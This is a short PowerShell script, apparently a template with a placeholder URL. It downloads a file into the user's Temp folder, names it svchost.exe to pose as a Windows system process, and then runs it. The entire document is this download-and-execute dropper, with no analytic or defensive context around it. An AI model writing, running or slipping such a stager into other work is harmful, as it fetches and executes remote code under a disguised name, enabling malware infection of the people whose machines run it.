$url="#URL#"

$path="$env:USERPROFILE\AppData\Local\Temp\svchost.exe"
Invoke-WebRequest "$url" -OutFile "$path"

& $path
